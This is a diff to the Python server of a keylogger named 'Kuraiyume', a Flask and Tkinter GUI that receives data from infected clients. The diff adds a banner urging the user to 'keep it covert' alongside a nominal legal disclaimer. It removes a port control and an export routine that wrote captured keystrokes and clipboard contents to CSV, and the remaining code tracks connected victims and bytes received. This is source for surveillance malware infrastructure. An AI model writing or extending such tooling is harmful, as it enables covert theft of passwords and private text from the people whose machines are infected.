@@ -1,3 +1,18 @@
+"""
+   ▄█   ▄█▄  ▄█     ▄████████  ▄██████▄     ▄█   ▄█▄ ███    █▄
+  ███ ▄███▀ ███    ███    ███ ███    ███   ███ ▄███▀ ███    ███
+  ███▐██▀   ███▌   ███    ███ ███    ███   ███▐██▀   ███    ███
+ ▄█████▀    ███▌  ▄███▄▄▄▄██▀ ███    ███  ▄█████▀    ███    ███
+▀▀█████▄    ███▌ ▀▀███▀▀▀▀▀   ███    ███ ▀▀█████▄    ███    ███
+  ███▐██▄   ███  ▀███████████ ███    ███   ███▐██▄   ███    ███
+  ███ ▀███▄ ███    ███    ███ ███    ███   ███ ▀███▄ ███    ███
+  ███   ▀█▀ █▀     ███    ███  ▀██████▀    ███   ▀█▀ ████████▀  (Server)
+  ▀                ███    ███              ▀
+                                                   Kuraiyume
+
+Pro Tip: Keep it clean, keep it covert. Always ensure your actions align with legal boundaries and ethical standards. Use responsibly, and stay sharp:>>
+"""
+
 import threading
 import base64
 import json
@@ -8,7 +23,6 @@ from flask import Flask, request, jsonify
 import tkinter as tk
 from tkinter import scrolledtext, ttk, filedialog
 from werkzeug.serving import make_server
-import csv
 
 # Flask app setup
 app = Flask(__name__)
@@ -219,17 +233,6 @@ class ServerGUI:
         self.font_size_spinbox.pack(pady=5)
         self.font_size_spinbox.bind("<Return>", self.change_font_size)
 
-        ttk.Label(self.control_frame, text="Server Port:").pack(pady=5)
-        self.port_spinbox = tk.Spinbox(self.control_frame, from_=1024, to=65535)
-        self.port_spinbox.pack(pady=5)
-        self.port_spinbox.bind("<Return>", self.change_port)
-
-        self.export_button = ttk.Button(self.control_frame, text="Export Data", command=self.export_data)
-        self.export_button.pack(pady=10)
-
-        self.status_label = ttk.Label(self.control_frame, text="Status: Server not running")
-        self.status_label.pack(pady=10)
-
         self.stats_label = ttk.Label(self.control_frame, text="Connected Clients: 0, Data Received: 0 bytes")
         self.stats_label.pack(pady=10)
 
@@ -309,29 +312,6 @@ class ServerGUI:
         font_size = int(self.font_size_spinbox.get())
         self.log_text.configure(font=("TkDefaultFont", font_size))
         self.log(f"Font size changed to {font_size}.")
-
-    def change_port(self, event=None):
-        port = int(self.port_spinbox.get())
-        # Logic to change the server port
-        # Note: Changing the port dynamically is non-trivial and requires restarting the server
-        self.log(f"Server port changed to {port}.")
-
-    def export_data(self):
-        file_path = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV files", "*.csv")])
-        if file_path:
-            with open(file_path, 'w', newline='') as csvfile:
-                csv_writer = csv.writer(csvfile)
-                csv_writer.writerow(["Type", "Data"])
-                
-                with open(keystrokes_file_path, 'r') as file:
-                    for line in file:
-                        csv_writer.writerow(["Keystroke", line.strip()])
-                
-                with open(clipboard_file_path, 'r') as file:
-                    for line in file:
-                        csv_writer.writerow(["Clipboard", line.strip()])
-
-            self.log(f"Data exported to {file_path}.")
 
     def update_stats(self):
         self.stats_label.config(text=f"Connected Clients: {len(connected_ips)}, Data Received: {data_received} bytes")
